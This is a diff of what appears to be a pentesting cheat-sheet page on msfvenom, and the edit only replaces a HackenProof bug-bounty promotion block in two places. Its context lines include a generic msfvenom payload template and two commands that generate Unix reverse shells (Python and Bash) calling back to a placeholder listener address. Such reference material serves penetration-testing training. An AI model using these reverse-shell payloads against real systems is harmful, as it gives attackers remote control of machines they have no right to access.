@@ -12,15 +12,24 @@
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
+**HackenProof is home to all crypto bug bounties.**
 
-🐞 Read web3 bug tutorials
+**Get rewarded without delays**\
+HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.
 
-🔔 Get notified about new bug bounties
+**Get experience in web3 pentesting**\
+Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.
 
-💬 Participate in community discussions
+**Become the web3 hacker legend**\
+Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.
+
+[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!
+
+{% embed url="https://hackenproof.com/register" %}
+
+---
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
@@ -185,15 +194,22 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
+**HackenProof is home to all crypto bug bounties.**
 
-🐞 Read web3 bug tutorials
+**Get rewarded without delays**\
+HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.
 
-🔔 Get notified about new bug bounties
+**Get experience in web3 pentesting**\
+Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.
 
-💬 Participate in community discussions
+**Become the web3 hacker legend**\
+Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.
+
+[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!
+
+{% embed url="https://hackenproof.com/register" %}
 
 <details>
 
